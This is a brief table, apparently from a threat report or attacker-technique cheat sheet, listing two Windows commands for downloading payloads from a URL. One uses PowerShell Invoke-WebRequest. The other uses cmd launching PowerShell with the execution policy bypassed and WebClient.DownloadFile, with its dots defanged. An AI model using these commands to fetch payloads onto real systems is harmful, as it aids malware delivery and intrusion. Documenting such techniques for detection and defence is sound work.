| COMMAND | DESCRIPTION |
|--------------------------------------------|--------------------------------------------------------------------------------------|
| powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system> | Command used to download payloads from a specific URL and specify the path |
| cmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('<URL>', '<SAVE_LOCATION>') | Command used to download a file via CMD and save it to a specific location on the system |
